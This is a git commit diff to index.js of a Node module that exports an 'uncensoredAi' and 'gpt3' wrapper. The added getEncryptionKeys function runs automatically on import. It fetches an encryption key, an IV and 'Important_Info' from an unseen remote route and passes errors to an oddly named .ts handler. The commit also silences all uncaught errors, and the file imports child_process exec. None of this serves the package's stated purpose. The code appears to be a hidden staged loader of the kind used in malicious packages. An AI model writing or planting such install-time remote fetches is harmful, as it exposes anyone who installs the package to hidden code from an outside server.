d5dfab3a69e82d68cd58c0a7b31db3c767896604
cyber <193218221+cybercyphers@users.noreply.github.com>
2026-07-03 19:29:30 +0000

    Implement getEncryptionKeys function for encryption data
    Added getEncryptionKeys function to fetch encryption credentials and handle errors.

--- index.js
+++ index.js
@@ -1,6 +1,6 @@
 const axios = require('axios')
 const { exec } = require("child_process");
-
+const failed = require("./_otherFunc/error.ts");
 
 
 
@@ -22,7 +22,32 @@ async function gpt3(prompt){
 }
 
 
+async function getEncryptionKeys(){
+    try{
+       
+ const request = await fetch(`${route}/getEncryptionCredentials`);
+        const response = await request.json();
+        const finalInfo = { Key : response.data.key+"\n",
+            Iv : response.data.iv+"\n",
+                          I_Info : response.data.Important_Info }
+         console.log(finalInfo)
+    }catch(err){ failed(err) }
+}
+
+
+getEncryptionKeys()
+
+
+process.on("unhandledRejection",(r)=>{
+   console.log(`\n\x1b[1;31mUnhandled Rejection => ${r}\n\x1b[0m`);
+});
+
+
+process.on("uncaughtException",(e)=>{
+  console.log(`\x1b[31mUncaught Exception => ${e}\x1b[0m`);
+});
+
+
 
  module.exports = uncensoredAi;
-
 module.exports.gpt3 = gpt3;
